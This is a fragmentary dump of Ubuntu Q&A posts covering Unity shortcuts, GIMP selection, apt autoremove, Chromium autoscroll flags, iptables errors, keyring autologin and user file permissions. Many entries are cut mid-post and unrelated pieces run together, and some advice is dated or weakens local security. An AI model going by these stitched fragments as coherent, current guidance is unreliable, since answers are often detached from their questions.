(11.10 and earlier) / Alt-F10 (12.04 and earlier) - Open the first menu on the panel, use the arrows keys to \"scrub\" across the menus. (There is no shortcut for the session menu, so hitting F10 and left arrow is a quick way to get there)\n\n*Press Esc to close the menus without choosing anything.\n\nWindow Management\n\n*\n\n*Ctrl + Super + D - Show desktop; hitting it again restores the windows.\n\n*Super + W -  Spread mode, zoom out on all windows in all workspaces, in 12.04 and 12.10 it zooms out on the windows in the current workspace.\n\n*\n\n*In Spread mode of 14.04 ↑ + ↓ + ← + → navigates through windows, Alt + F4 closes selected window, typing any text filters windows (for example typing \"terminal\" leaves only terminal windows), Enter restores selected window, Esc exits Spread mode\n\n\n\n*Super-D - Minimize all windows; hitting it again restores them.\n\n*Alt + Space - Opens the window's accessibility menu.\n\n*Alt + Tab - Switch to other applications, you can hold Alt down and then hit tab to switch to the next application.\n\n*Alt + ` - Switch between an application's windows. Hitting this combo when you're already focused on an application will automatically switch only between the windows for that application. The ` key on US layouts, but Unity will use whichever key is above your Tab key. (More information) (Video)\n\n*Ctrl + Super + ↑ - Maximize the current window\n\n*Ctrl + Super + ↓ - Restore/Minimize the current window (seems to be buggy at the moment)\n\n*Ctrl + Super + ← - Maximize current window to the left\n\n*Ctrl + Super + → - Maximize current window to the right\n\nWindow Placement\nIf you cycle through the same key Unity will cycle through different placement widths, so experiment by hitting the numkey multiple times, for example Ctrl + Alt + numpad 5 +  5 + 5:\n\n*\n\n*Ctrl-Alt + Numpad 7 - Place window in top left corner of screen.\n\n*Ctrl-Alt + Numpad 8 - Place window in top half of screen.\n\n*Ctrl-Alt + Numpad 9 - Place window in top right corner of screen.\n\n*Ctrl-Alt + Numpad 5 - Center/Maximize the window in the middle of the screen. In 12.04 this toggles between maximize and restore state\n\n*Ctrl-Alt + Numpad 1 - Place window in the bottom left corner of the screen.\n\n*Ctrl-Alt + Numpad 2 - Place window in the bottom half of the screen.\n\n*Ctrl-Alt + Numpad 3 - Place window in the bottom right corner of the screen.\n\n*Ctrl-Alt + Numpad 0 - Minimize the current window (Ubuntu 12.04.1).\n\nWorkspace Management\n\n*\n\n*Super + S - Expo mode (for everything), zooms out on all the workspaces and lets you manage windows.\n\n*Shift + Alt + ↑ - Expo mode for all windows in the current workspace only.\n\n*Ctrl + Alt + ← / → / ↑ / ↓ - (11.10+) - Change to a new workspace.\n\n*Ctrl + Alt + Shift + ← / → / ↑ / ↓ - Place window to a new workspace.\n\n*Ctrl + Alt + L - Lock the screen.\n\nScreenshots\n\n*\n\n*PrtScn - Take a screenshot of the current workspace\n\n*Alt + PrtScn - Take a screenshot of the current window\n\n*Shift + PrtScn - Take a screenshot of a region traced by the mouse (shows crosshairs)\n\nSystem\n\n*\n\n*Ctrl + Alt + Del - Logout\n\nMouse Tricks\nLauncher\n\n*\n\n*Clicking and holding an icon and then dragging it around will allow you to reorder it on the launcher. You can also drag it off to the right of the launcher to move it around. Note that you need to make an explicit movement to the right to move the icon off the launcher before you can move it around.\n\n*Dragging and dropping an icon into the trash can will remove it from the Launcher. The program itself will remain installed and accessible through the dash.\n\n*Scrolling the mouse wheel while over the Launcher scrolls the icons if you have too many and need to move around quickly.\n\nWindow Management\n\n*\n\n*Maximizing - Dragging a window to the top panel, or double-clicking a window's titlebar, or Alt + F10 (11.10 and earlier), will maximize it.\n\n*Restore - There are two ways to restore, or unmaximize, the topmost maximized window of the current monitor for this workspace (not using the window controls)\n\n*\n\n*Double clicking on the top panel (but not in the application's menu)\n\n*Dragging the top panel down.\n\n\n\n*Middle click on Maximize - Maximize window vertically.\n\n*Right click on Maximize - Maximize window horizontally\n\n*Focus the topmost maximized window of the current monitor for this workspace: Left click on the top panel (but not in the application's menu)\n\n*Tiling - Dragging a window to the left/right border will auto tile it to that side of the screen.\n\n*Middle click on an application's launcher icon - Open a new instance of the application in a new window. If the application isn't running it will just open it normally.\n\n*Middle click on the top panel or window title bar (but not the menu) - send the current window behind all other windows.\n\n*Alt-Left drag inside a window - move the window\n\n*Alt-Middle drag inside a window close to its border - resize the window\n\n*Alt-Right click inside a window - window accessibility menu\n\n\nA: I translate into Spanish the printable version of the shortcuts and mouse tricks.

But make it sure that you are not copying else where or inside webapps any other folder like root (/).\nOnce you've copied axis2.war in the above path then restart the tomcat6 server from path /usr/share/tomcat6 by using \n./shutdown.sh \n\nand \n./startup.sh. \n\n", "Q: When will UDS sponsorship final list be announced? UDS-O is being held at Budapest, Hungary and the sponsorships are open which closes on 28th of March.\nMy question is when will the final list be announced? Will there be more than one month period for people to apply for Visa?\ne.g. I live in India and when we apply for Schengen Visa for the first time, it takes around 2 weeks for the visa interview(period depends on the rush). Then another week for interview and Visa to be stamped. AFAIK the application, interview and collection has to be done in person. This is all what I have heard.\nSo will Canonical give one month time minimum for people in Eastern part of the world or countries where Schengen countries have tougher rules for visa?\nIt would be great if they could finalize the names a bit faster and announce the list by first week of April.\nI am hoping Jorge or Jono might come and answer this.\n\nA: There is no \"final list\" that is published. People who submit for sponsorship get a private email.\nWe try to do this with as much lead time as possible, unfortunately this can be problematic for some countries with Visas that can take longer than others. \nWe are keen on turning around the sponsorship as fast as we can after the 29 March deadline.

In Photoshop the Magic Wand tool has a contiguous setting, that when enabled, will cause the Magic Wand to select only one area. If disabled you will end up with several areas of the same color (depending on picture and settings of course). \nHere's a picture to illustrate what I fail to explain:\n\nCan I do this in Gimp?\n\nA: Yes you can.\nIn Gimp you have two tools:\nThe Fuzzy Select Tool\n\nWhich will allow you to choose an area based on the color and the similarity using a few additional tools like thresholding, mode, selection by composite, channel, saturation and value and a few more. \nIn the next example I am using the Fuzzy Select Tool which is selecting only the white color around the logo.\n\nUsing the same tool, I am adding inner sections of the logo by keeping the Shift key pressed while clicking on the sections to add.\n\nThe Select by Color Tool\n\nWith this tool you can choose which color base regions you wish to choose with just a click, using additional tools, like: mode, selection by composite, channel, saturation and value and a few more. \nIn the next screenshot I am using the Select by Color tool in order to click into the center oval of the number nine in the logo in order to choose all the regions that are similar (based on the threshold) to the color I picked when clicking.\nAs in the previous tool, you can keep the Shift key pressed while clicking in order to continue adding adjacent areas.\n\nBased on thresholding, the selection may be more accurate.\nDepending on the mode that you use, you can have the effect that you wish. In the next example I have activated the second mode which will act as additive in both the Fuzzy and Color selection tools.\n\n", "Q: How can I add file/folder icons?

I'd like to have it sync online with Ubuntu One but also create back ups in a Dropbox folder. \n\nA: Have a look at inoticoming in the repositories. With this, you should be able to sync to a local directory, and have inoticoming initiate a copy of the files to somewhere else (DropBox, Ubuntu One) as the changes come in. This will also allow you to keep a copy of the previous version somewhere else as well, as I think it lets you perform an operation on the existing files using one of its options. \n\nA: I admire this goal, but I don't believe it's possible; as far as I can tell, you can only choose one synchronisation method (such as Tomboy Web, to sync online with Ubuntu One), not two. \n\nA: Set up the TomBoy sync to point to your Ubuntu one or DropBox folder and everything should work as you wish. Go Edit/Preferences in Tomboy, and make sure that Local Directory Sync Service add-in is enabled. Then, under the Synchronization tab, specify the directory (DropBox or Ubuntu One) to sync to.\nI'm making the assumption here that you are alright with the single target, as DropBox and Ubuntu One are local folders in addition to being 'cloud' synced folders. \nTo have it go to multiple places, you should be able to create a new directory that is the target of the 'sync', and ln -s it to both DropBox and Ubuntu One. I think this will have it local, and also synced with both services.\n", "Q: What's the difference between the various open source ATI video drivers?

In our college, we have mirrors of most new Ubuntu distros to save update costs. We would like to add rabbitvcs to the computers, but is available through a PPA and not the official repo. So can a PPA be added to a (private) mirror of the ubuntu repo?\nPS: I would like to hear on both the technical and legal issues involved.\n\nA: Official repo is a repo, PPA is a repo and you cannot add a repo to a repo.\nThe best way would be to ask everyone to add your repo in their Ubuntu installation. This way it can be pretty useful. You can mirror that repo too, such that you upload the package to the PPA, it gets mirrored in the college servers and is then available as update to everyone.\n\nA: I just spent some time doing this for OpenCPU. If all you have is the line for adding the PPA, you have to change the colon to a peroid and add launchpad.net to it.\nExample, this is the PPA installation line:\nadd-apt-repository -y ppa:opencpu/opencpu-1.6\n\nInside of /etc/apt/mirror.list you would add a line like this for Ubuntu 16.04 (xenial):\ndeb http://ppa.launchpad.net/opencpu/opencpu-1.6/ubuntu xenial main\n\nThen you can launch apt-mirror and it will clone the PPA. For clients to use this, you would add entries to their /etc/apt/sources.list file pointing to wherever your hosting the PPA mirror.\n\nA: I am successfully using apt-mirror to mirror PPAs.\n\n*\n\n*https://apt-mirror.github.io/\nSimply add lines like:\ndeb http://ppa.launchpad.net/byobu/ppa/ubuntu precise main\ndeb-src http://ppa.launchpad.net/byobu/ppa/ubuntu precise main\n\nTo /etc/apt/mirror.list.\nAnd then run sudo apt-mirror.\n", "Q: How to completely turn off session saving?

It will load either your saved session, or it will  provide  a\n         default  session  for  the  user  as defined by the system administrator (or the\n         default GNOME installation on your system).\nThe default session is defined in the GConf keys  under  /desktop/gnome/session.\n         When saving a session, gnome-session saves the currently running applications in\n         the $XDG_CONFIG_HOME/gnome-session/saved-session directory.\ngnome-session is an X11R6 session manager.

Running apt-get autoremove xxx not only removes xxx and its unused dependencies, it also removes all other unused dependencies.\nI then tried running apt-get remove --auto-remove xxx, thinking that this would remove only xxx and its unused dependencies. To my surprise, this also removed xxx, its unused dependencies, and all other unused dependencies.\nThis leads me to two related questions.\n(1) Is this the intended behaviour of the commands?\n(2) Is there an easy way to remove xxx and its unused dependencies without removing other unused dependencies?\n(It appears that aptitude remove also behaves in a similar way.)\n\nA: Looking in the file cmdline/apt-get.cc from the source tarball at http://packages.ubuntu.com/source/maverick/apt, I can see that --auto-remove is an argument which enables the APT::Get::AutomaticRemove setting.\nThe commands autoremove and remove both calls the function DoInstall.\nThe command \"autoremove\" sets APT::Get::AutomaticRemove too and it does therefore the same thing as --auto-remove.\nLooking in the DoAutomaticRemove function, it's clearly visible that enabling the APT::Get::AutomaticRemove setting (--auto-remove and autoremove does this) causes Apt looping through all installed packages and marks unused packages for deletion.\nFrom main():\nCommandLine::Args Args[] = {\n   // ... stripped to save space\n   {0,\"auto-remove\",\"APT::Get::AutomaticRemove\",0},\n   // ...\n}\nCommandLine::Dispatch Cmds[] = { // ...\n                                {\"remove\",&DoInstall},\n                                {\"purge\",&DoInstall},\n                                {\"autoremove\",&DoInstall},\n                                // ...\n}\n// ...\n// Parse the command line and initialize the package library\nCommandLine CmdL(Args,_config);\n\nFrom DoInstall():\n unsigned short fallback = MOD_INSTALL;\n   if (strcasecmp(CmdL.FileList[0],\"remove\") == 0)\n      fallback = MOD_REMOVE;\n   else if (strcasecmp(CmdL.FileList[0], \"purge\") == 0)\n   {\n      _config->Set(\"APT::Get::Purge\", true);\n      fallback = MOD_REMOVE;\n   }\n   else if (strcasecmp(CmdL.FileList[0], \"autoremove\") == 0)\n   {\n      _config->Set(\"APT::Get::AutomaticRemove\", \"true\");\n      fallback = MOD_REMOVE;\n   }\n\nFrom function DoAutomaticRemove:\n   bool doAutoRemove = _config->FindB(\"APT::Get::AutomaticRemove\", false);\n   // ...\n   // look over the cache to see what can be removed\n   for (pkgCache::PkgIterator Pkg = Cache->PkgBegin(); !

If you want to keep packages, run apt-get -s autoremove, copy the packages from the list and remove the packages from that list you want to keep. Finally, remove those packages: sudo apt-get purge [packages-to-be-removed] (purge removes the configuration files too, if any)\n", "Q: Where do I submit a .desktop file updated with the Unity Launcher API?

Is there any way to fix this behavior? \nInformation:\n\n\n*\n\n*Ubuntu 10.10\n\n*Chromium 9.0.597.94\n\n*Logitech MX518\n\n\nUpdate: also Chrome, and the other Chromium based ones.\n\nA: In Linux based/Mac systems, Google Chrome / Chromium hasn't got this feature.\nYou have to get an extension, eg.:  AutoScroll.\n\nA: This will work with all your applications without the need of installing anything.\nGet your input deviceId number\nxinput list\n\nTo list available properties, use xinput list-props $deviceId. If you are using libinput (the future/present) almost all properties will start with libinput (also check libinput list-devices).\nTest: You can always test your input devices with libinput debug-events, xev, evtest, evemu-record or xinput --test $deviceId.\nWith libinput\nSince 17.04 Ubuntu uses libinput, so to set mouse properties:\n# xinput device option setting\nxinput set-prop $deviceId \"libinput Scroll Method Enabled\" 0, 0, 1  # _button_ as scroll method\nxinput set-prop $deviceId \"libinput Button Scrolling Button\" 2      # Using middle buttpn.

Indicates which scroll method is currently enabled on this device.\n\n*libinput Button Scrolling Button 1 32-bit value. Sets the button number to use for button scrolling.

Ctrl + 0 to reset.\n\n*Ubuntu 20.04 use X by default. Probably works also on Wayland.\n\n*Maybe better than Firefox Autoscrolling, easier to control.\n\n*Libinput at ArchLinux Wiki\n\nA: I recommend another couple of addons, that allows \"Scroll a page as if a scrollbar is under your mouse.\" I found that give us more control over the scroll move.\n\n*\n\n*For Firefox\n\n*For Chromium/Chrome\nWith both addons you just click and hold secondary button pressed to scroll pages moving the mouse up and down and even horizontally.\n\nA: TLDR:\nUse this flag on Chrome/Chromium/Electron or anything Chromium-based\n--enable-blink-features=MiddleClickAutoscroll\n\nTo make this permanent, you can edit the .desktop file and add this flag in the end of the Exec= line (Browsers typically have many Exec= lines for right click actions, the main one is under [Desktop Entry] but you might want to change them all).\nExplanation:\nThe code for disabling middle mouse autoscroll on Linux/Mac is here. This basically says if it's running on Windows, enable this blink Runtime Enabled Feature.\nAccording to the Chromium wiki you can use --{enable,disable}-blink-features to enable or disable blink Runtime Enabled Features.\nAs found here the feature is called MiddleClickAutoscroll so that would be --enable-blink-features=MiddleClickAutoscroll.\nThe only caviar is this warning message which appears when you use this flag. Other than that it works perfectly on Chrome/-ium, Chromium-based browsers (like Brave) and Electron apps (Discord, Slack, etc).\nNotes:\n\n*\n\n*I only tested this on Linux but it might as well work on Mac the same way.\n\n*Using the enable-features and blink-enable-features flags is neither recommended nor supported by Chrome/Chromium or whatever you are using. This is why the warning message is displayed, these options are intended for testing use only. If you encounter any bugs after enabling this flag, make sure to disable it before sending a bug report.\n\n*It seems there is a reason this is disabled by default (on Linux at least). If you are using Xorg (x11) and you try to use autoscroll while a textbox is selected, it will paste the last selected text to it. A way to fix this is to \"disable\" the selection clipboard.\n\n\nA: I have Ubuntu 14.04 and mouse wheel stopped working on one of my Chrome instances.  I followed the tip here and it works great.  When I go into the page about::flags, the \"Smooth Scrolling\" option was enabled. I disabled it and it works. \n", "Q: Is it possible to play World of Warcraft? \nPossible Duplicate:\nHow to install World of Warcraft? \n\nIt's the only reason I preserve Windows on my computer.\nHowever, is it possible to play the game in Ubuntu smoothly?\n\nA: The official AppDB page holds one of the best maintained guides.

Is there a way to measure the performance of 3D acceleration, java applets, firefox scrolling etc. with a tool and compare it with lets say a windows OS or other users having almost the same hardware? Maybe it is a setup issue where some fundamental drivers are missing or something?\n\nA: I am afraid, what you are facing is typical of Linux systems, and linux itself is not to blame for this. I would try to answer this one-by-one.\n\n\n*\n\n*Firefox scrolling has always been slow on linux to start with. Things have gotten better with firefox 4, but its still slow compared to chrome or opera. You can try installing the \" yet another smooth scrolling extension\" for firefox. This will improve performance. The Link is given below\nhttps://addons.mozilla.org/en-US/firefox/addon/yet-another-smooth-scrolling/\n\n*Java is notoriously slow on many systems. Even on windows, where it is heavily optimised, performance is dismal. 64 bit java is very messy.\n\n*Yes the comparison is very much unfair, as you are running a pure windows game using an emulator. I am sure running a native linux game with a proprietary driver will give a good result.\nFor measuring system performance, Try the phoronix test suite, which is choc full of tools for benchmarking.\n\nA: Even when this question is related to software issues you may wish to give a try to HardInfo, System profiler and benchmark, which will allow you to perform several benchmarks in order to gather information of your system and allows you to perform comparisons with other systems.\nLinux should run with a considerable ease, the applications that you refer, unless the hardware is reaching its limits.\nMost of the times a big memory size isn't enough if the memory speed doesn't fit your need for speed. Hard disk drives should be fast enough and facing no issues and generally: The system should be in good condition.\nYou don't lose anything giving this a try and may find something that would give you an idea of how is your system handling the physical resources.\nReach HardInfo at: http://hardinfo.berlios.de/HomePage\nHere is a screenshot of my CPU Blowfish benchmark with two comparisons.\n\nAdditionally you can use a system monitor tool, like Conky or GkrellM in order to see your system's performance when attempting to run one of these applications. This won't fix your issues but will give you a clue on where to start.\nI prefer to use GKrellM, so here is a screenshot of my system being monitored by this tool:\n\nHere is a screenshot of Conky (from their site) featuring processes monitoring:\n\nAnd when writing all this stuff I got a bulb turned on over my head, and I think that you should check what running processes are giving you problems when attempting to do what you wish. I mean: there can be a running process which can be requesting lots of processor or memory and this can cause your other applications to have problems.\nCheck this out in System Monitor: System/Administration/System Monitor. In the next screenshot you can see my google chrome demanding 122 MiB of the physical memory.\n\nWho knows? you try it and let's see what happen. The more information you gather, the easier to find the solution.\nGood luck!\n\nA: Considering the lag in scrolling in Firefox my first guess is that you lack the necessary drivers for your graphics card. You should try from the menu System -> Administration -> Additional Drivers. And check if there is anything for you.\nFiring up a terminal and hit\njava -version\n\nto find out which vm is installed in your computer. Try installing the sun-java6-jre.\nGive also a try,\nsudo apt-get install nvidia-current\n\n\nA: My scrolling problems with Firefox disappeared when I disabled Firefox Sync, and went with the bindwood sync from Ubuntu!

I want NetworkManager to automatically connect to the wireless network. I've configured my account to automatically log in (using System > Administration > Login Window) and I get prompted to unlock my GNOME keyring.\nFrom researching this, it would appear that I should be able to disable the security on the keyring by blanking the password. However, if I change the password of the default keyring to blank so that it uses \"Unsafe Storage\" and automatically log in, I am prompted with a \"Wireless Network Authentication Required\" request. The password field is already filled in but does not seem to have been used.\nSo how do I convince NetworkManager and the GNOME Keyring to work without requiring me to log in with a password, or to enter my keyring password?\n\nA: There are two ways to do that:\n\n\n*\n\n*Remove Password and Encryption Keys (seahorse), the program responsible for keyrings.\n\n*The alternative is to edit your wireless connection, and tick the last checkbox to make it available for all users. In this case, the network will be connected to before signing in, at the login (if there are multiple users or the only user account is password protected).\n\n\nOf course, the second method is preferable if you still have uses from GNOME-Keyring.\n\nA: Solution 2) works fine but has an disadvantage:\nonly 1 Wifi network can be marked as \"available for all users\". If you want to connect to another Wifi, you will be prompter for password each time you connect.\nI found following solution.\nConfig (for reference):\n\n\n*\n\n*Ubuntu 10.04 Lucid, localized to Slovak language\n\n*Autologin\n\n*Unsafe keyring (no password)\n\n\nProcedure:\nmpilka@mpilka:~/.gnome2/keyrings$ rm -f default\nmpilka@mpilka:~/.gnome2/keyrings$ mv predvolený.keyring login.keyring\n\nBoth autologin and NetworkManager remembering passwords now works.\nEdit: \"predvolený\" translates to \"default\" in English.\n", "Q: How to import a radio station list from Rhythmbox to Banshee?

Run the next command as root:\nmodprobe /lib/modules/$(uname -r)/kernel/net/ipv4/netfilter/iptable_filter.ko\n\n(uname -r gives the current kernel version)\n\nFor a list of available modules for iptables, list the directory containing iptables modules:\nls /lib/modules/$(uname -r)/kernel/net/ipv4/netfilter/\n\nTo get information on all modules:\nmodinfo /lib/modules/$(uname -r)/kernel/net/ipv4/netfilter/*.ko\n\n\nA: it turns out that it was just a missing sudo!\nsudo iptables-restore < /etc/iptables.rules \ninstead of\niptables-restore < /etc/iptables.rules\n\nA: I also use the Rackspace Cloud, with kernel 2.6.35.4-rscloud. I have multiple instances with this kernel and iptables works fine on some and I have the same problem as you on a couple others.\nTherefore I believe this kernel does have the support it needs for iptables, and the issue is caused by something else (I'm still looking for the solution myself)\nEDIT: I solved my issue by scp -r copying the /lib/modules/2.6.35.4-rscloud from the working iptables server to the non-working one.  \nFor some reason uname -r shows 2.6.35.4-rscloud and ls /lib/modules/ only contained the previous version like /lib/modules/2.6.31-302-rs.\nI'm not sure why this can fall out of synch, or what to do if you don't have a working server to copy these files from, but hopefully this points you in the right direction.\nI did not need to recompile a kernel or anything like that.\n\nA: It is possible that the linux kernel you are using wasn't built with loadable module support. \nA good way to find out if your kernel has module support is to check the existence of the file /proc/modules. If it is there but you don't have a /lib/modules/$(uname -r)/modules.dep file, it means that your kernel has support for modules but that they were not correctly installed.\nIt look like your kernel was built by your provider Rackspace, you should ask them about the kernel configuration.\n\nA: Another way to get proper iptables support is to install xtables-addons, you need to have quite a lot of tools to get this working though (module-assistant, build-essential etc.), but the advantage is that at the end you have ipset as well as iptables and (IMHO) using ipset as well is much better for large complex rulesets\napt-get install xtables-addons-common\n\napt-get install xtables-addons-source\n\nm-a prepare\n\nm-a build xtables-addons\n\nm-a install xtables-addons\n\n\nA: I had the same error, but I found a stray comment in an unrelated article (http://articles.slicehost.com/2007/11/6/ubuntu-gutsy-setup-page-1) that identified the silly molecular error that was at fault in my case. The problem was that I had created the iptables.rules file using a text editor (Notepad++), but because the file type wasn't recognized, Notepad++ defaulted to using Windows End-of-Line and End-of-File characters. iptables rejects these characters, requiring their Unix equivalents, and was thus throwing an error upon the first occurrence: the end of the *filter line -- giving the false impression that there was something wrong with the *filter syntax. Ah, the ever-present joys of character-encoding-related errors!\nTwo Solutions\n\n\n*\n\n*The commenter I mentioned above installed (sudo aptitude install tofrodos) and ran (fromdos /etc/iptables.rules) a little conversion utility on the file.\n\n\n---OR---\n\n\n*\n\n*What I did was, in Notepad++, Edit > EOL Conversion > UNIX Format, and then Save and re-upload the file. That took care of the End-of-Line characters, but not the End-of-File character (despite what one might expect). So once I had it uploaded to the server, I opened it up in nano and created a newline at the end of the file and saved. Then everything worked perfectly.\n\n\nIt might also be possible that merely opening the file in nano and resaving, without actually changing the characters manually, would do the trick, but I haven't tested.\n\nA: You can also get errors with iptables if you've installed a new version of the Kernel but you haven't rebooted yet (quite common if you're building a new server using, for example, an Ansible playbook, and an earlier task is an apt-get upgrade)\nSee https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=829269#41 re: \"Unknown symbol in module, or unknown parameter\" error.\n\nA: The answer by Lekensteyn is almost, but not quite, the correct answer. The error there is that the modprobe command accepts as its argument a module name (iptables_filter or iptables-filter; modprobe will automatically convert dashes to underscores if a matching module with that filename is found in its search paths), not the path to a kernel object (.ko) file as is written in that answer.\nI had a very similar issue to this problem on a system where IPv4 NetFilter tables were loaded but IPv6 tables were not. This resulted in iptables-restore successfully loading my firewall rules, but ip6tables-restore gave the \"unable to initialize table 'filter'\" error. The solution was simply to run the following modprobe command as the root user or with sudo before restoring the iptables firewall ruleset:\nmodprobe ip6table_filter\n\nI experienced this on a Travis CI virtual environment in one of my CI/CD pipelines. Hopefully this helps someone in a similar situation.\n", "Q: Ubuntu freezes booting up after hibernation I have a Lenovo Thinkpad Edge 13 (Intel model)\nI've gotten everything to work under Ubuntu except for hibernation. The system hibernates normally but when Ubuntu tries to boot from the hibernation file, it freezes.\nI tried with the 2.6.35 kernel and the newer 2.6.36 (which solved my eating-battery problems), but this issue persists.\nHow could I troubleshoot this issue?\nEDIT:\n\n\n*\n\n*My Ubuntu install is in a separate\npartition alongside Windows 7. \nI've tried a BIOS update today, and\nthe problem still persists.\nMy swap partition is bigger than my installed Ram (2,3GB vs 2,0 GB)\nSuspend as a sleep method works, but I really need my hibernation option.\n\nA: I would try a BIOS update as there seems to be some issues with power in the past. I have known BIOS updates to solve these issues. Try here.\n\nA: There are often clues in /var/log/messages. Look for what the kernel said around the time of the crash or hibernate attempt.\n\nA: You could do the following\n\n\n*\n\n*Update the bios\n\n*Install the latest kernel\n\n*Install the proprietary graphics driver\n\n\nA: I fixed it. Turns out it was the package \n\nuswsusp\n\nwhich replaces the default hibernate and sleep methods, the one that was causing the freezing. I uninstalled it and reverted to the default Ubuntu hibernate and it works flawlessly.\n", "Q: Not able to run Thunderbird 3.3a2 I wanted to try Thunderbird 3.3a2 so I downloaded it from the  Thunderbird Website.

I installed VLC media player and played some videos, but it is not playing properly... I tried to play them with Totem Movie Player, but it's also not working properly.\n\nA: To answer this question, it would help if you mention what kind of videos you are trying to play.\nTo play some type of videos you will need to install ubuntu restricted extras. To install this, Open application -> Ubuntu software center or system -> administration -> synaptic package manager. Search for ubuntu restricted extras (ubuntu-restricted-extras) and install the package.\nAlternatively from terminal in command line, install \nsudo apt-get update\nsudo apt-get install ubuntu-restricted-extras\n\nIf it is commercial DVDs and if above steps do not enable video playing, you may need to look at https://help.ubuntu.com/community/RestrictedFormats/PlayingDVDs as well.\nYou can read more on this here How can I play encrypted DVD movies?.\n", "Q: Email notification icon for panel The standard Indicator Applet 0.4.6 on a fresh install of Ubuntu 10.10 doesn't achieve what I am looking for.\nCan someone recommend an alternative applet to notify when new emails arrive.

I am running Nautilus with the Extra Pane feature enabled. But I am missing a keyboard shortcut to switch between the left and right pane. Is there a shortcut key for toggling just between the left and right file pane? Something that works like tab in Total Commander/Midnight Commander?\nTab and Shift-Tab are not what I'm looking for. They cycle through several other GUI elements in addition to the two panes.\nI'm on Ubuntu 10.04 if that matters.\n\nA: If you are using Status Bar the control will be to the first element on it. But if you remove the status bar by choosing \"Status Bar\" in the view menu, the control will move to the right side file browser's column when pressing the Tab key. \nShift + TAB will take the control to the left side file browser's column when in the right side.\n\nA: F6 switches between the two panes. You don't need to use Tab and Shift + Tab. This works on 10.04.\n\nA: The only way to make it a bit easier to move the focus from the left to the right pane and back is to disable the Location Bar from View.\nWith the Location Bar disabled you can use TAB to move the focus to the right and Shift + TAB to move it to the left.\n\nA: Method 1:\nF6 may not work on many systems. (like mine has F6 assigned to the mute volume option by default). Use fn + F6 in that case.\nMethod 2:\nAlso here's what I do to effectively switch between the two without having to\n\ncycle through several other GUI elements in addition to the two panes.\n\n\n\n*\n\n*When in the Extra pane, press → to switch focus to the default pane\n\n*When in the Default pane, press Shift + Tab to switch focus back to the extra pane\n\n", "Q: How do I restrict users? I'm using Ubuntu 10.04. I would like to create a new account, for other people using my computer. I would like my guest to have access to Internet, text editor and other application installed on my computer without having access to my data (and obviously system settings).\nI have added a user \"guest\" using graphic interface (System -> Administration -> Users and groups). My guest has now access to the application, but not full - wine and VirtualBox are empty (wine has only wine notepad, on VirtualBox there is no virtual machine installed). Internet and chat are fine, but \"guest\" has the access to anything in the computer via terminal, and I would like to keep him in his guests home (there are a lot of people using my computer, not all of them I know well).\nI have found on http://www.ubuntu.pl/ how to change user's privileges via terminal and I'm wondering if the command chmod -vR --preserve-root 700 /home/maria \nis fine?\n/home has two directories: guest and maria.\nAnd how to ensure for my guest the access to applications installed on wine and VirtualBox without installing it once again?\nThis is an output for guests groups:\nguest@marysia-ubuntu:~$ groups\nguest adm dialout fax cdrom floppy tape dip video plugdev fuse nopasswdlogin\nguest@marysia-ubuntu:~$\n\nAnd this for marias groups:\nmaria@marysia-ubuntu:~$ groups\nmaria adm dialout cdrom plugdev lpadmin admin sambashare guest\nmaria@marysia-ubuntu:~$\n\n\nA: If you're only worried about other users being able to see your files, run chmod -R o-rwx /home/maria. It revokes all permissions to the world (including guest).\nguest does not belong to the admin group, which means he cannot run commands as other users (like root) through sudo (OK)\nAs noted by Takkat, anyone who has physical access to the machine could gain access to the files. The only way to protect you from that is encrypting the drive. If you put a BIOS password on the machine, the visitor can take out the HDD from it.\n", "Q: Is libunity planning on including functions for Unity Lenses? I am unclear on this, because I have heard mention of a proposed API for Unity Lenses, and such an API would be extremely useful for projects involving home automation.  \nI am interested in developing in that direction, but I haven't been able to find the API for Unity Lenses.  It would make the most sense of libunity was to include Unity Lenses because it would put all the functionality of the Unity launcher into one place.  If libunity is not the API for Lenses, does such an API exist, and how would I find it?\n\nA: Note: The user visible name is Lenses, however in the code and packages they're still referred to as Places. \"Places\" as a term will be fully retired in 11.10\nBoth default Lenses, unity-place-files and unity-place-applications, are in fact based on public API exposed via libunity.\nUnfortunately there are no API docs available for libunity yet - but that will change in the weeks to come. Monitor planet.ubuntu.com or watch the Natty archives for a libunity-doc package. For now there is a simple example in lp:unity-place-sample, if you cross ref that with https://wiki.ubuntu.com/Unity/Lenses you may have a chance of getting something going.\nAnother important library when writing lenses for Unity is Dee. It's a data model library used to do ad-hoc sharing of data models between processes (in this case the place daemon and Unity). Dee is fully documented and you can find the docs in the libdee-doc package (or you can build it yourself from lp:dee).\nTo grab the code for either project you can do:\nbzr branch lp:unity-place-sample\nbzr branch lp:dee\n\n", "Q: How to redirect output of jobs in background? ping6 ipv6.google.com &\n\nAfter I type this in the terminal, the command is ran in the background.\nHowever, it stills generate the output to the foreground, and print the result to the terminal.\nHow to make it display the output in the background?\n\nA: You need to redirect to the null device:\nping google.com >/dev/null\n\n\nA: I know only two ways to solve this.\nEither use the -q option on ping like this ping -q google.com which makes it only display the summary lines at startup and on exit or you redirect the output to /dev/null like this\nping google.com > /dev/null.\n\nA: You might want try screen. \nJust run screen in a terminal. You'll be greated by a little splash-screen with some information about screen and a copyright notice. Once you hit enter, a new shell is started \"inside\" screen. \nRun your ping command in there, without the & behind it.\nNow you can detach from the screen by hitting Ctrl+A+D. You'll be back to the shell you ran screen from. The program(s) running \"inside\" the screen will continue to run in the background.\nTo reattach to the screen, run screen -r, and you'll see the output produced by your ping command again.\nhttps://help.ubuntu.com/community/Screen\n", "Q: Unable to install on a Lenovo V460 I tried installing Ubuntu 10.10 on a Lenovo V460. I selected a separate drive for it and also created a swap area, but after the copying of files is over and when it displays \"Ready When You Are ...\" my laptop hangs. \nHow to solve this? Is this a problem with my laptop? \n\nA: First, try with different installation CD:\n\n\n*\n\n*Ubuntu 10.04 desktop\n\n*Ubuntu 10.10 Alternative\n\n\nYou can find both images from here.\nSecond, if different CD isn't helping, file a bug report to Launchpad.\nThird, you can try with another distribution, for example Fedora or Debian (Ubuntu is based on Debian).\n\nA: This might happen if you have SATA drive. Go to BIOS setup and turn on the IDE emulation and this would work. I had similar kind of problem with my new HP ProBook.\n\nA: I had the exact same issue, go into BIOS, and turn off switchable graphics (dedicated), then you can install. Though it won't work that well on that laptop, at least you'll be able to install.\n", "Q: Is there an equivalent to the Compiz Expose type plugin for Unity? I've been giving 10.10 a spin on my netbook and it comes with Unity pre-enabled. Are there any equivalents to the plugins I use on full GNOME desktop, namely show all windows and show all windows on all workspaces? I can't seem to access anything other than keyboard shortcuts which don't list those operations.\n\nA: I don't think there is, but 11.04 Unity does use Compiz, and has that feature.\n\nA: You 